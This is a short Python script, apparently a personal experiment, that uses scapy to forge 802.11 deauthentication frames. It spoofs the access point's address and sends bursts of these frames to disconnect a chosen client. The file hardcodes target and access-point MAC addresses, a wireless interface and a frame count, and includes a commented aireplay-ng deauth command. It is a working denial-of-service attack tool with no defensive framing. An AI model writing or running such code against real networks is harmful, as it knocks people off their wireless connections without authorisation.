import sys
import argparse

import warnings
from cryptography.utils import CryptographyDeprecationWarning
from scapy.layers.dot11 import RadioTap, Dot11Deauth, Dot11

with warnings.catch_warnings():
    warnings.filterwarnings('ignore', category=CryptographyDeprecationWarning)
    # FIXME: ignoring warnings from cryptography.
    from scapy.all import *


def argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--client", help="Client Mac Address", required=True)
    parser.add_argument("-a", "--bssid", help="Access Point Mac Address")
    parser.add_argument("-p", "--packet", help="Count packet")
    parser.add_argument("-i", "--interface", help="Monitor mode interface")
    return parser.parse_args()


def deauth_test1(clientMac: str,
                 apMac: str,
                 count: int,
                 interface: str):
    packet: Any = RadioTap() / Dot11(addr1=clientMac, addr2=apMac, addr3=apMac) / Dot11Deauth()
    return sendp(packet, iface=interface, count=int(count), inter=0.2)


def run_from_console():
    args = argument()

    clientMac = args.client
    apMac = args.bssid
    count = int(args.packet)
    iface = args.interface

    print(args)

    # result = deauth(clientMac, apMac, count, iface)
    # print(str(result))


# aireplay-ng --deauth 10 -a F6:8C:EB:27:6C:AA -c 18:F0:E4:1F:B2:84 wlp0s20f3mon
def de_authentication_test():
    target_mac, gateway_mac = "18:F0:E4:1F:B2:84", "F6:8C:EB:27:6C:AA"

    # 802.11 frame
    #   addr1: destination MAC
    #   addr2: source MAC
    #   addr3: Access Point MAC

    dot11: Dot11 = Dot11(addr1=target_mac,
                         addr2=gateway_mac,
                         addr3=gateway_mac)

    packet_data: Any = RadioTap() / dot11 / Dot11Deauth(reason=7)

    # send the packet
    sendp(packet_data,
          iface="wlp4s0",
          count=100,
          inter=0.1,
          verbose=1)


if __name__ == '__main__':
    # run_from_console()
    de_authentication_test()
